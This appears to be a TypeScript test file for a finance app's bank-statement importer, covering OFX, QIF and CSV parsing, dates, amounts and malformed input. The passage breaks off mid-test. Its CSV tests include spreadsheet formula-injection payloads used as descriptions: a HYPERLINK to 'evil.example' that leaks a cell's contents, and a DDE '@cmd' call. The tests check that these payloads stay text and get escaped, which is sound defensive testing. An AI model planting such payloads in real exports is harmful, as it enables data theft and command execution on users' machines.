import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { decodeFile, detectFormat, formatFromName } from '@/lib/import/text';
import { dateFor, dateStyle, detectDateOrder, ofxDay, readDateText } from '@/lib/import/dates';
import { detectDecimalMark, readAmount } from '@/lib/import/amounts';
import { accountMask, bankType, ofxRecords, parseOfx } from '@/lib/import/ofx';
import { columnsFromNames, columnsProblem, csvRecords, detectDelimiter, guessColumns, namesOf, readCsvTable, splitCsv, type CsvTable } from '@/lib/import/csv';
import { parseQif, qifRecords } from '@/lib/import/qif';
import { readImport, type ImportOptions, type ReadResult } from '@/lib/import/read';
import { contentKey, keyHash, normalizeDescription, normalizeRecords, type ImportRow } from '@/lib/import/normalize';
import { matchRows, countOutcomes, FITID_DAYS, type StoredRow } from '@/lib/import/match';
import { MAX_CSV_COLUMNS, MAX_FIELD_CHARS, MAX_IMPORT_ROWS, MAX_STATEMENTS, type RawRecord } from '@/lib/import/record';
import { csvCell } from '@/lib/csv';
import { manualRowForDisplay, type ManualTxn } from '@/lib/manual-txns';
import { countsInTotals } from '@/lib/spending';
import { planFlow } from '@/lib/fire/inputs';

// The import pipeline's pure stages (lib/import/): each parser against files
// modelled on real bank exports (test/fixtures/import/), malformed and hostile
// input, and the normalize and match stages. No storage anywhere here; the
// store, the route and undo are test/import-routes.test.ts.

const FIXTURES = join(import.meta.dir, 'fixtures', 'import');
const bytes = (name: string) => new Uint8Array(readFileSync(join(FIXTURES, name)));
const fixture = (name: string) => decodeFile(bytes(name)).text;
const enc = (s: string) => new TextEncoder().encode(s);
const YEAR = 2026;
const TODAY = '2026-10-09';

/** A file read to its records, answering what it asks with `options`. */
function ready(text: string, options: ImportOptions = {}): Extract<ReadResult, { status: 'ready' }> {
  const r = readImport(text, { options, thisYear: YEAR });
  if (r.status !== 'ready') throw new Error(`expected ready, got ${r.status}: ${JSON.stringify(r).slice(0, 300)}`);
  return r;
}
const rows = (records: RawRecord[]) => normalizeRecords(records, { today: TODAY, currency: 'USD' });

describe('reading a file as text', () => {
  test('a byte order mark decides, and is dropped: UTF-8, UTF-16 either way round', () => {
    expect(decodeFile(new Uint8Array([0xef, 0xbb, 0xbf, 0x41, 0xc3, 0xa9]))).toEqual({ text: 'Aé', encoding: 'utf-8' });
    expect(decodeFile(new Uint8Array([0xff, 0xfe, 0x41, 0, 0xe9, 0]))).toEqual({ text: 'Aé', encoding: 'utf-16le' });
    expect(decodeFile(new Uint8Array([0xfe, 0xff, 0, 0x41, 0, 0xe9]))).toEqual({ text: 'Aé', encoding: 'utf-16be' });
  });

  test('valid UTF-8 is UTF-8; anything else is Windows-1252, the old Western code page, never replacement characters', () => {
    expect(decodeFile(enc('Café'))).toEqual({ text: 'Café', encoding: 'utf-8' });
    // "Café €5" as Windows-1252: é is E9, € is 80.
    expect(decodeFile(new Uint8Array([0x43, 0x61, 0x66, 0xe9, 0x20, 0x80, 0x35]))).toEqual({ text: 'Café €5', encoding: 'windows-1252' });
  });

  test('an OFX 1.x header’s character set is believed', () => {
    const { text, encoding } = decodeFile(bytes('checking-ofx102.ofx'));
    expect(encoding).toBe('windows-1252');
    expect(text).toContain('<NAME>CAFÉ ALLEGRO');
    expect(text).not.toContain('�');
    // ENCODING:UTF-8 is UTF-8, even where the bytes would also be valid 1252.
    const utf8 = decodeFile(enc('OFXHEADER:100\nDATA:OFXSGML\nENCODING:UTF-8\nCHARSET:NONE\n\n<OFX><NAME>Zoë</OFX>'));
    expect(utf8.encoding).toBe('utf-8');
    expect(utf8.text).toContain('Zoë');
  });

  test('the format is what the file holds, whatever its name says', () => {
    expect(detectFormat(fixture('checking-ofx102.ofx'))).toBe('ofx');
    expect(detectFormat(fixture('card-ofx220.ofx'))).toBe('ofx');
    expect(detectFormat(fixture('two-accounts.qfx'))).toBe('ofx');
    expect(detectFormat(fixture('checking.qif'))).toBe('qif');
    expect(detectFormat(fixture('card-debit-credit.csv'))).toBe('csv');
    expect(detectFormat(fixture('giro-semicolon.csv'))).toBe('csv');
    expect(detectFormat('\n\n  !Account\nNChecking\n^\n')).toBe('qif');
    expect(formatFromName('Statement.QFX')).toBe('ofx');
    expect(formatFromName('export.qif')).toBe('qif');
    expect(formatFromName('download')).toBeNull();
  });
});

describe('dates', () => {
  test('ISO, compact and named-month dates are one day whatever the order', () => {
    for (const [text, day, style] of [
      ['2026-09-30', '2026-09-30', 'iso'],
      ['2026/9/3', '2026-09-03', 'iso'],
      ['2026.09.30', '2026-09-30', 'iso'],
      ['20260930', '2026-09-30', 'compact'],
      ['2026-09-30 14:22:01', '2026-09-30', 'iso'],
      ['2026-09-30T14:22:01+02:00', '2026-09-30', 'iso'],
      ['30 Sep 2026', '2026-09-30', 'named'],
      ['30-Sep-26', '2026-09-30', 'named'],
      ['30. September 2026', '2026-09-30', 'named'],
      ['Sep 30, 2026', '2026-09-30', 'named'],
      ['September 3rd 2026', '2026-09-03', 'named'],
      ['05/05/2026', '2026-05-05', 'numeric'], // the same either way
    ] as const) {
      expect(readDateText(text, YEAR), text).toEqual({ kind: 'fixed', day, style });
    }
  });

  test('how a file’s dates are written, for the sheet to say: the style most of them have, numbers in the order read', () => {
    expect(dateStyle(['2026-09-30', '2026-10-01', '30 Sep 2026'], null, YEAR)).toBe('iso');
    expect(dateStyle(['30/09/2026', '05/05/2026', '01/02/2026'], 'dmy', YEAR)).toBe('dmy');
    expect(dateStyle(['01/02/2026'], null, YEAR)).toBeNull(); // an order nobody gave yet
    expect(dateStyle(['not a date'], 'mdy', YEAR)).toBeNull();
    // As the readings report it.
    expect(ready(fixture('checking.qif')).read.date_style).toBe('mdy');
    expect(ready(fixture('card-debit-credit.csv'), { csv: { columns: { date: 0, description: 3, debit: 5, credit: 6 }, sign: 'negative-out' } }).read.date_style).toBe('iso');
    expect(ready(fixture('giro-semicolon.csv'), { csv: { columns: { date: 0, description: 2, amount: 7 }, sign: 'negative-out' } }).read.date_style).toBe('dmy');
    expect(ready(fixture('card-ofx220.ofx')).read.date_style).toBeNull();
  });

  test('a numeric date with the year last is read in each order it fits', () => {
    expect(readDateText('03/04/2026', YEAR)).toEqual({ kind: 'ordered', mdy: '2026-03-04', dmy: '2026-04-03' });
    expect(readDateText('13/04/2026', YEAR)).toEqual({ kind: 'ordered', mdy: null, dmy: '2026-04-13' });
    expect(readDateText('04/13/2026 2:22 PM', YEAR)).toEqual({ kind: 'ordered', mdy: '2026-04-13', dmy: null });
    expect(readDateText('30.09.2026', YEAR)).toEqual({ kind: 'ordered', mdy: null, dmy: '2026-09-30' });
  });

  test('Quicken’s apostrophe and padding, and two-digit years', () => {
    expect(dateFor("1/2'26", 'mdy', YEAR)).toBe('2026-01-02');
    expect(dateFor("1/ 2'26", 'mdy', YEAR)).toBe('2026-01-02');
    expect(dateFor("12/31' 5", 'mdy', YEAR)).toBe('2005-12-31');
    expect(dateFor('1/2/26', 'dmy', YEAR)).toBe('2026-02-01');
    // This century unless that is more than a year ahead.
    expect(dateFor('12/31/99', 'mdy', YEAR)).toBe('1999-12-31');
    expect(dateFor('12/31/27', 'mdy', YEAR)).toBe('2027-12-31');
    expect(dateFor('12/31/28', 'mdy', YEAR)).toBe('1928-12-31');
  });

  test('not dates: impossible days, a needed order nobody gave, words, overlong text', () => {
    for (const text of ['2026-02-30', '2026-13-01', '31/31/2026', 'yesterday', '12/2026', '1/2/326', 'x'.repeat(41), '']) {
      expect(dateFor(text, 'mdy', YEAR), text).toBeNull();
    }
    expect(dateFor('03/04/2026', null, YEAR)).toBeNull();
    expect(dateFor('2026-03-04', null, YEAR)).toBe('2026-03-04');
  });

  test('a file’s order: the one its dates fit; asked when every date fits both; mixed when they disagree', () => {
    expect(detectDateOrder(['01/02/2026', '13/02/2026'], YEAR)).toEqual({ order: 'dmy', ambiguous: false, mixed: false });
    expect(detectDateOrder(['01/02/2026', '02/13/2026'], YEAR)).toEqual({ order: 'mdy', ambiguous: false, mixed: false });
    // Every date fits both: never guessed.
    expect(detectDateOrder(['01/02/2026', '03/04/2026', '05/05/2026'], YEAR)).toEqual({ order: null, ambiguous: true, mixed: false });
    expect(detectDateOrder(['13/02/2026', '02/13/2026'], YEAR)).toEqual({ order: null, ambiguous: false, mixed: true });
    // ISO dates and ones the same either way decide nothing.
    expect(detectDateOrder(['2026-01-02', '05/05/2026'], YEAR)).toEqual({ order: null, ambiguous: false, mixed: false });
  });

  test('OFX dates: the day as written, with or without a time and zone, never moved by the zone', () => {
    for (const [text, day] of [
      ['20260105', '2026-01-05'],
      ['20260105120000', '2026-01-05'],
      ['20260105120000.000', '2026-01-05'],
      ['20260105120000.000[-5:EST]', '2026-01-05'],
      ['20260105230000[-5:EST]', '2026-01-05'], // January 6 in UTC: still the bank's January 5
      ['20260105000000[+9:JST]', '2026-01-05'],
      ['20260105120000[+5.30:IST]', '2026-01-05'],
      ['20260105120000[0:GMT]', '2026-01-05'],
      ['202601051200[-5]', '2026-01-05'],
      [' 20260105 ', '2026-01-05'],
      ['2026-01-05', '2026-01-05'],
      ['20260105T120000', '2026-01-05'],
    ] as const) {
      expect(ofxDay(text), text).toBe(day);
    }
    for (const text of ['2026010', '20261305', '20260230', '20260105250000', 'tomorrow', '']) expect(ofxDay(text), text).toBeNull();
  });
});

describe('amounts', () => {
  test('as banks write them, with the file’s decimal mark', () => {
    const cases: [string, '.' | ',', number | null][] = [
      ['1,234.56', '.', 1234.56],
      ['-1.234,56', ',', -1234.56],
      ['(12.34)', '.', -12.34],
      ['12.34-', '.', -12.34],
      ['+12.34', '.', 12.34],
      ['$1,234.56', '.', 1234.56],
      ['-$12.00', '.', -12],
      ['€ 12,50', ',', 12.5],
      ['1 234,56', ',', 1234.56],
      ['1 234,56', ',', 1234.56],
      ["1'234.56", '.', 1234.56],
      ['−12.34', '.', -12.34],
      ['.50', '.', 0.5],
      ['0,5', ',', 0.5],
      ['1,234', ',', 1.234], // one and a bit with a comma for decimals
      ['1,234', '.', 1234],
      // Wrong for the mark, or not amounts at all: never a hundredfold one.
      ['12,50', '.', null],
      ['12..34', '.', null],
      ['1,2,3', '.', null],
      ['USD 12.34', '.', null],
      ['1e5', '.', null],
      ['--12', '.', null],
      ['', '.', null],
      ['abc', '.', null],
    ];
    for (const [text, mark, value] of cases) expect(readAmount(text, mark)?.value ?? null, `${text} with ${mark}`).toBe(value);
  });

  test('a CR or DR says the direction outright', () => {
    expect(readAmount('12.34 CR', '.')).toEqual({ value: 12.34, direction: 'in' });
    expect(readAmount('12.34DR', '.')).toEqual({ value: 12.34, direction: 'out' });
  });

  test('the mark a file shows: before the last one or two digits, or the later of two', () => {
    expect(detectDecimalMark(['-45,67', '3.150,00', '-3,10'])).toBe(',');
    expect(detectDecimalMark(['1,234.56', '12.5', '4.00'])).toBe('.');
    expect(detectDecimalMark(['1,234', '12'])).toBeNull();
    expect(detectDecimalMark([])).toBeNull();
  });
});

describe('OFX 1.02 (SGML): a credit union checking statement', () => {
  const text = fixture('checking-ofx102.ofx');
  const r = ready(text);

  test('the statement: kind, currency, account (masked), dates covered and the ledger balance with its day', () => {
    expect(r.format).toBe('ofx');
    expect(r.statement).toEqual({
      index: 0,
      label: 'Checking ending 4567',
      kind: 'bank',
      account: { bank_id: '325081403', mask: '4567', type: 'CHECKING' },
      currency: 'USD',
      start: '2026-09-01',
      end: '2026-09-30',
      count: 9,
      ledger: { amount: 1946.05, as_of: '2026-09-30' },
    });
    // The full account number is never part of what the sheet or a store gets.
    expect(JSON.stringify(r.statement)).not.toContain('0001234567');
  });

  test('each STMTTRN: FITID, DTPOSTED, TRNAMT negated to Plaid’s sign, NAME, MEMO as the note', () => {
    expect(r.problems).toEqual([]);
    const [pay, coffee] = r.records;
    expect(pay).toMatchObject({ source: 'ofx', source_id: '202609010001', date: '2026-09-01', posted_date: '2026-09-01', amount: -2450, description: 'ACME CORP PAYROLL', note: 'DIRECT DEP PPD ID 9876543210', currency: 'USD', line: 43 });
    expect(coffee).toMatchObject({ source_id: '202609030001', amount: 4.5, description: 'SQ *BLUE BOTTLE COFFEE' });
    // The raw record is the STMTTRN as the file had it.
    expect(coffee.raw).toEqual({ TRNTYPE: 'DEBIT', DTPOSTED: '20260903', TRNAMT: '-4.50', FITID: '202609030001', NAME: 'SQ *BLUE BOTTLE COFFEE', MEMO: 'POS PURCHASE 0902 SEATTLE WA' });
  });

  test('DTPOSTED is the date where DTUSER is given too; Windows-1252 and entities read; a check without a name is named by its number', () => {
    const cafe = r.records.find((x) => x.source_id === '202609050001')!;
    expect(cafe).toMatchObject({ date: '2026-09-05', description: 'CAFÉ ALLEGRO', amount: 23.1 });
    expect((cafe.raw as Record<string, string>).DTUSER).toBe('20260904');
    expect(r.records.find((x) => x.source_id === '202609120001')!.description).toBe('AT&T *WIRELESS');
    expect(r.records.find((x) => x.source_id === '202609100001')).toMatchObject({ description: 'Check 1042', amount: 1450 });
    expect(r.records.find((x) => x.source_id === '202609300001')).toMatchObject({ description: 'INTEREST PAID', amount: -0.42 });
  });

  test('flipped, every amount reads the other way round', () => {
    expect(ready(text, { flip: true }).records.map((x) => x.amount).slice(0, 2)).toEqual([2450, -4.5]);
  });
});

describe('OFX 2.2 (XML): a credit card statement', () => {
  const r = ready(fixture('card-ofx220.ofx'));

  test('CREDITCARDMSGSRSV1: purchases are money out, the payment and the refund money in, the balance owed negative as written', () => {
    expect(r.statement).toMatchObject({ kind: 'creditcard', label: 'Credit card ending 4321', currency: 'USD', ledger: { amount: -1234.56, as_of: '2026-09-30' } });
    expect(r.statement!.account).toEqual({ bank_id: null, mask: '4321', type: null });
    expect(r.records.map((x) => [x.description, x.amount])).toEqual([
      ["TRADER JOE'S #123", 87.2],
      ['NETFLIX.COM', 15.49],
      ['PAYMENT - THANK YOU', -500],
      ['B&H PHOTO 800-606-6969', 42],
      ['REFUND B&H PHOTO', -12.5],
    ]);
    // An empty <MEMO></MEMO> is no note, and doesn't swallow anything.
    expect(r.records[3].note).toBeNull();
    expect(r.records[0]).toMatchObject({ date: '2026-09-02', note: 'GROCERY STORES', source_id: '2026090224692166245000123' });
    expect(r.read.reversed_hint).toBe(false);
  });
});

describe('QFX: two statements in one file', () => {
  const text = fixture('two-accounts.qfx');

  test('asks which one, listing each with its account and what it holds', () => {
    const r = readImport(text, { options: {}, thisYear: YEAR });
    expect(r.status).toBe('statement');
    if (r.status !== 'statement') return;
    expect(r.statements.map((s) => [s.index, s.label, s.count, s.ledger?.amount])).toEqual([
      [0, 'Checking ending 3333', 2, 3210.99],
      [1, 'Savings ending 6666', 1, 10003.21],
    ]);
  });

  test('reads the one chosen, SGML with its leaves unended or ended alike, Intuit’s tags passed over', () => {
    expect(ready(text, { statement: 0 }).records.map((x) => [x.source_id, x.amount, x.description])).toEqual([
      ['QFX-CHK-1', 120, 'CITY OF SEATTLE UTIL'],
      ['QFX-CHK-2', -1500, 'DEPOSIT'],
    ]);
    expect(ready(text, { statement: 1 }).records.map((x) => [x.source_id, x.amount, x.description, x.date])).toEqual([['QFX-SAV-1', -3.21, 'INTEREST EARNED', '2026-09-30']]);
    expect(readImport(text, { options: { statement: 5 }, thisYear: YEAR }).status).toBe('error');
  });
});

describe('OFX that isn’t tidy', () => {
  const head = 'OFXHEADER:100\nDATA:OFXSGML\nVERSION:102\n\n';
  const stmt = (trns: string, extra = '') =>
    `${head}<OFX><BANKMSGSRSV1><STMTTRNRS><STATUS><CODE>0</STATUS><STMTRS><CURDEF>USD${extra}<BANKACCTFROM><BANKID>1<ACCTID>99887766<ACCTTYPE>SAVINGS</BANKACCTFROM><BANKTRANLIST>${trns}</BANKTRANLIST></STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>`;
  const trn = (fields: string) => `<STMTTRN>${fields}</STMTTRN>`;

  test('a whole file on one line, lower-case tags, and an element left empty that swallows the fields after it', () => {
    const text = stmt(trn('<trntype>debit<dtposted>20260903<trnamt>-4.50<fitid>A1<memo></memo><name>Lower case')) + '';
    expect(ready(text).records[0]).toMatchObject({ source_id: 'A1', amount: 4.5, description: 'Lower case' });
    // SGML: an empty element with no end tag, then the rest.
    const swallowed = stmt(trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-4.50<FITID>A2<MEMO>\n<NAME>Still found')).replace('</STMTTRN>', '</STMTTRN></MEMO>');
    expect(ready(swallowed).records[0]).toMatchObject({ source_id: 'A2', description: 'Still found' });
  });

  test('a transfer’s other account keeps only its last four characters in the raw record', () => {
    const text = stmt(trn('<TRNTYPE>XFER<DTPOSTED>20260903<TRNAMT>-500.00<FITID>X1<NAME>To savings<BANKACCTTO><BANKID>325081403<ACCTID>000987654321<ACCTTYPE>SAVINGS</BANKACCTTO>'));
    const [r] = ready(text).records;
    expect((r.raw as any).BANKACCTTO).toEqual({ BANKID: '325081403', ACCTID: '4321', ACCTTYPE: 'SAVINGS' });
    expect(JSON.stringify(r.raw)).not.toContain('987654321');
  });

  test('a stray "<" in a value, comments, CDATA and a transaction’s own currency', () => {
    const text = stmt(
      trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-4.50<FITID>B1<NAME>A < B <!-- a comment -->Shop') +
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260904<TRNAMT>-10,00<FITID>B2<NAME><![CDATA[Fish & <Chips>]]><CURRENCY><CURRATE>1.1<CURSYM>EUR</CURRENCY>')
    );
    const [a, b] = ready(text).records;
    expect(a.description).toBe('A < B Shop');
    expect(b).toMatchObject({ description: 'Fish & <Chips>', amount: 10, currency: 'EUR' });
  });

  test('a transaction that can’t be read is listed with its line and why, and the rest are read', () => {
    const text = stmt(
      [
        trn('<TRNTYPE>DEBIT<TRNAMT>-1.00<FITID>C1<NAME>No date'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>2026-13-45<TRNAMT>-1.00<FITID>C2<NAME>Bad date'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>lots<FITID>C3<NAME>Bad amount'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<FITID>C4<NAME>No amount'),
        trn(`<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1.00<FITID>C5<NAME>${'x'.repeat(50_000)}`),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1.00<FITID>C6<CORRECTFITID>C1<CORRECTACTION>DELETE<NAME>Fix'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-2.00<FITID>C7<NAME>Fine'),
      ].join('\n')
    );
    const r = ready(text);
    expect(r.records.map((x) => x.source_id)).toEqual(['C7']);
    expect(r.problems.map((p) => [p.line, p.reason])).toEqual([
      [5, 'It has no date.'],
      [6, 'Its date (2026-13-45) can’t be read.'],
      [7, 'Its amount (lots) can’t be read.'],
      [8, 'It has no amount.'],
      [9, `A field is over ${MAX_FIELD_CHARS.toLocaleString('en-US')} characters long, so this transaction can’t be read.`],
      [10, 'It corrects an earlier transaction (DELETE), so it isn’t imported: check that transaction by hand.'],
    ]);
    // What is kept of a huge field is bounded too.
    expect(JSON.stringify(r.problems[4].raw).length).toBeLessThan(MAX_FIELD_CHARS + 500);
  });

  test('files with no statement say why: an investment statement, the bank’s own error, nothing at all', () => {
    const inv = `${head}<OFX><INVSTMTMSGSRSV1><INVSTMTTRNRS><INVSTMTRS><CURDEF>USD</INVSTMTRS></INVSTMTTRNRS></INVSTMTMSGSRSV1></OFX>`;
    expect(readImport(inv, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('investment statement') });
    const failed = `${head}<OFX><BANKMSGSRSV1><STMTTRNRS><TRNUID>1<STATUS><CODE>2000<SEVERITY>ERROR<MESSAGE>General error</STATUS></STMTTRNRS></BANKMSGSRSV1></OFX>`;
    expect(readImport(failed, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: 'This file holds no statement the bank could produce.' });
    const signon = `${head}<OFX><SIGNONMSGSRSV1><SONRS><STATUS><CODE>15500<SEVERITY>ERROR</STATUS></SONRS></SIGNONMSGSRSV1></OFX>`;
    expect(readImport(signon, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('error 15500') });
    expect(parseOfx(`${head}<OFX></OFX>`).error).toBe('This OFX file holds no bank or credit card statement.');
  });

  test('a bank whose debits are mostly positive writes its signs the other way round: a hint, never a silent flip', () => {
    const text = stmt([1, 2, 3, 4].map((i) => trn(`<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>${i}.00<FITID>D${i}<NAME>Shop ${i}`)).join(''));
    const r = ready(text);
    expect(r.read.reversed_hint).toBe(true);
    expect(r.records[0].amount).toBe(-1); // read as the file says until the person flips it
    expect(ready(text, { flip: true }).read.reversed_hint).toBe(false);
  });

  test('hostile nesting and a billion-row claim are bounded by what the file actually holds', () => {
    const deep = `${head}<OFX>${'<X>'.repeat(20_000)}${'</X>'.repeat(20_000)}${stmt(trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1<FITID>E1<NAME>Deep')).slice(head.length + 5)}`;
    expect(() => parseOfx(deep)).not.toThrow();
    const claim = stmt(trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1<FITID>E2<NAME>One'), '<NTRN>1000000000<INTU.ROWS>999999999999');
    const started = performance.now();
    expect(ready(claim).records).toHaveLength(1);
    expect(performance.now() - started).toBeLessThan(1000);
  });

  test('more transactions than one import takes: the file is refused whole, never cut short', () => {
    const many = stmt(Array.from({ length: MAX_IMPORT_ROWS + 1 }, (_, i) => trn(`<TRNAMT>-1<DTPOSTED>20260903<FITID>F${i}<NAME>N`)).join(''));
    expect(readImport(many, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('more than 10,000 transactions') });
  });

  test('account masks: the last four characters, spaces and dashes aside', () => {
    expect(accountMask('0001234567')).toBe('4567');
    expect(accountMask('12-34 56')).toBe('3456');
    expect(accountMask('12')).toBe('12');
    expect(accountMask(null)).toBeNull();
    expect(ofxRecords(parseOfx(stmt('')).statements[0]).records).toEqual([]);
  });
});

describe('CSV with separate money-out and money-in columns', () => {
  const text = fixture('card-debit-credit.csv');
  const table = readCsvTable(text) as CsvTable;

  test('the byte order mark is gone, the columns named, and a mapping proposed from the names', () => {
    expect(table.delimiter).toBe(',');
    expect(table.header).toEqual(['Transaction Date', 'Posted Date', 'Card No.', 'Description', 'Category', 'Debit', 'Credit']);
    expect(table.header_line).toBe(1);
    expect(guessColumns(table.header)).toEqual({ date: 0, description: 3, category: 4, debit: 5, credit: 6 });
  });

  test('quoted commas, doubled quotes and a line break inside a field, with each row’s own line', () => {
    const r = ready(text, { csv: { columns: { date: 0, description: 3, category: 4, debit: 5, credit: 6 }, sign: 'negative-out' } });
    expect(r.problems).toEqual([]);
    expect(r.read).toMatchObject({ decimal: '.', date_order: null, dates_ordered: false, skipped: 0 });
    expect(r.records.map((x) => [x.line, x.date, x.amount, x.description])).toEqual([
      [2, '2026-09-28', 23.99, 'AMAZON MKTPL*2X3Y4, AMZN.COM/BILL WA'],
      [3, '2026-09-27', -500, 'CAPITAL ONE MOBILE PYMT'],
      [4, '2026-09-25', 64.12, 'WHOLEFDS "MKT" 10234'],
      [5, '2026-09-24', 4.5, 'BLUE BOTTLE COFFEE\r\nSEATTLE WA'],
      [7, '2026-09-24', 4.5, 'BLUE BOTTLE COFFEE\r\nSEATTLE WA'],
      [9, '2026-09-20', 9.99, '=HYPERLINK("http://evil.example/?x="&A1,"Refund")'],
      [10, '2026-09-18', 1, '+SUM(1+2)'],
      [11, '2026-09-15', 2, "@cmd|' /C calc'!A0"],
      [12, '2026-09-12', -35, 'REI #48 SEATTLE'],
      [13, '2026-09-10', 10.99, 'SPOTIFY USA'],
      [14, '2026-09-01', 4, 'GITHUB INC'],
    ]);
    expect(r.records[0]).toMatchObject({ category: 'Merchandise', source: 'csv' });
    expect(r.records[0].raw).toEqual(['2026-09-28', '2026-09-29', '4321', 'AMAZON MKTPL*2X3Y4, AMZN.COM/BILL WA', 'Merchandise', '23.99', '']);
  });

  test('a formula in a description stays text: stored as written, and guarded wherever a CSV of it is written', () => {
    const r = ready(text, { csv: { columns: { date: 0, description: 3, debit: 5, credit: 6 }, sign: 'negative-out' } });
    const names = rows(r.records).rows.map((x) => x.row.name);
    const formulas = names.filter((n) => /^[=+@-]/.test(n));
    expect(formulas).toEqual(['=HYPERLINK("http://evil.example/?x="&A1,"Refund")', '+SUM(1+2)', "@cmd|' /C calc'!A0"]);
    for (const f of formulas) expect(csvCell(f).replace(/^"/, '').startsWith("'")).toBe(true);
  });
});

describe('a European CSV: semicolons, decimal commas, day first, Windows-1252', () => {
  const text = fixture('giro-semicolon.csv');

  test('the summary lines above the table are skipped, the separator and decimal comma found, the dates read day first', () => {
    const t = readCsvTable(text) as CsvTable;
    expect(t.delimiter).toBe(';');
    expect(t.header_line).toBe(13);
    expect(t.skipped).toBe(9);
    expect(t.header).toEqual(['Buchung', 'Valuta', 'Auftraggeber/Empfänger', 'Buchungstext', 'Verwendungszweck', 'Saldo', 'Währung', 'Betrag', 'Währung (2)']);
    const guess = guessColumns(t.header);
    expect(guess).toMatchObject({ date: 0, description: 2, amount: 7, note: 4 });
    const r = ready(text, { csv: { columns: { date: 0, description: 2, amount: 7, note: 4, currency: 8 }, sign: 'negative-out' } });
    expect(r.read).toMatchObject({ decimal: ',', date_order: 'dmy', dates_ordered: true });
    expect(r.records.map((x) => [x.date, x.amount, x.currency, x.description, x.note])).toEqual([
      ['2026-09-30', 45.67, 'EUR', 'REWE Markt GmbH', 'REWE SAGT DANKE 47110815'],
      ['2026-09-29', 89, 'EUR', 'Stadtwerke München', 'Strom Abschlag 09/2026'],
      ['2026-09-28', 12.4, 'EUR', 'Café Kränzler', 'Kaffee und Kuchen'],
      ['2026-09-15', -3150, 'EUR', 'Arbeitgeber GmbH', 'Lohn September'],
      ['2026-09-03', 1250, 'EUR', 'Vermieter Immobilien', 'Miete Wohnung 09/2026'],
      ['2026-09-01', 3.1, 'EUR', 'Bäckerei Müller', 'Brötchen €'],
    ]);
  });

  test('read with a point for decimals instead, the amounts fail to read rather than come out a hundredfold', () => {
    const r = ready(text, { decimal: '.', csv: { columns: { date: 0, description: 2, amount: 7 }, sign: 'negative-out' } });
    expect(r.records.filter((x) => Math.abs(x.amount) >= 100 * 45)).toEqual([]);
    expect(r.problems.length).toBeGreaterThanOrEqual(5);
  });
});

describe('CSV in general', () => {
  const map = (columns: object, sign: 'negative-out' | 'positive-out' = 'negative-out') => ({ csv: { columns: columns as never, sign } });

  test('one amount column: both sign conventions, and CR or DR deciding for itself', () => {
    const text = 'Date,Description,Amount\n2026-09-01,Coffee,-4.50\n2026-09-02,Refund,12.00\n2026-09-03,Card fee,3.00 DR\n2026-09-04,Credit,5.00 CR\n';
    const out = ready(text, map({ date: 0, description: 1, amount: 2 })).records.map((x) => x.amount);
    expect(out).toEqual([4.5, -12, 3, -5]);
    const card = ready(text, map({ date: 0, description: 1, amount: 2 }, 'positive-out')).records.map((x) => x.amount);
    expect(card).toEqual([-4.5, 12, 3, -5]);
  });

  test('a file whose every date fits both orders asks, and is read in the order the person gives', () => {
    const text = 'Date,Description,Amount\n09/01/2026,A,-1\n09/02/2026,B,-2\n10/03/2026,C,-3\n';
    const asked = readImport(text, { options: map({ date: 0, description: 1, amount: 2 }), thisYear: YEAR });
    expect(asked.status).toBe('date_order');
    if (asked.status === 'date_order') expect(asked).toMatchObject({ detection: { ambiguous: true, mixed: false }, examples: ['09/01/2026', '09/02/2026', '10/03/2026'] });
    expect(ready(text, { ...map({ date: 0, description: 1, amount: 2 }), date_order: 'mdy' }).records.map((x) => x.date)).toEqual(['2026-09-01', '2026-09-02', '2026-10-03']);
    expect(ready(text, { ...map({ date: 0, description: 1, amount: 2 }), date_order: 'dmy' }).records.map((x) => x.date)).toEqual(['2026-01-09', '2026-02-09', '2026-03-10']);
  });

  test('a file mixing both orders asks too, and the dates that don’t fit the answer aren’t read', () => {
    const text = 'Date,Description,Amount\n13/01/2026,A,-1\n01/13/2026,B,-2\n';
    expect(readImport(text, { options: map({ date: 0, description: 1, amount: 2 }), thisYear: YEAR })).toMatchObject({ status: 'date_order', detection: { mixed: true } });
    const r = ready(text, { ...map({ date: 0, description: 1, amount: 2 }), date_order: 'dmy' });
    expect(r.records.map((x) => x.date)).toEqual(['2026-01-13']);
    expect(r.problems).toEqual([{ line: 3, reason: 'Its date (01/13/2026) can’t be read as day/month/year (UK, Europe).', raw: ['01/13/2026', 'B', '-2'] }]);
  });

  test('lines that can’t be read: shifted columns, no date, no amount, both directions, a huge field', () => {
    const text = [
      'Date,Description,Debit,Credit',
      '2026-09-01,Fine,1.00,',
      '2026-09-02,Unquoted, comma,2.00,',
      ',No date,3.00,',
      '2026-09-04,No amount,,',
      '2026-09-05,Both,1.00,2.00',
      `2026-09-06,${'y'.repeat(MAX_FIELD_CHARS + 1)},1.00,`,
      '2026-09-07,Short row,4.00',
      'Total,,10.00,',
    ].join('\n');
    const r = ready(text, map({ date: 0, description: 1, debit: 2, credit: 3 }));
    expect(r.records.map((x) => [x.line, x.description, x.amount])).toEqual([
      [2, 'Fine', 1],
      [8, 'Short row', 4],
    ]);
    expect(r.problems.map((p) => [p.line, p.reason])).toEqual([
      [3, 'This line has 5 fields where the others have 4: a description may hold an unquoted ",".'],
      [4, 'It has no date.'],
      [5, 'It has no amount.'],
      [6, 'It has both money out and money in.'],
      [7, `A field on this line is over ${MAX_FIELD_CHARS.toLocaleString('en-US')} characters long, so it can’t be read.`],
      [9, 'Its date (Total) can’t be read.'],
    ]);
  });

  test('a quote never closed stops the reading there, and says so', () => {
